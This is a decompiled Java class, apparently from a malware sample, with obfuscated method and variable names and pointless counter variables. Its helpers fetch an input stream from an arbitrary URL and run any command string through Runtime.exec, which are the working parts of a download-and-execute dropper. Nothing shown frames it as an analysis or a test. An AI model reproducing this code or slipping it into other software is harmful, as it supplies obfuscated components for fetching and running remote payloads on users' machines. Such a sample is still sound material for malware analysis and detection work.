import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Solol
{
    public static Runtime Greengo() {
        final int cst = 22;
        return Runtime.getRuntime();
    }
    
    public static InputStream Doipo(final String wgpen3) throws Exception {
        final URL plnrw3 = new URL(wgpen3);
        int cnt = 52;
        try {
            plnrw3.openConnection();
            ++cnt;
        }
        catch (Exception ex) {}
        return plnrw3.openStream();
    }
    
    public static void Pbmvv(final String pnpgg) throws Exception {
        final int cnt = 26;
        final Process plnrrw = Greengo().exec(pnpgg);
        plnrrw.waitFor();
    }
}
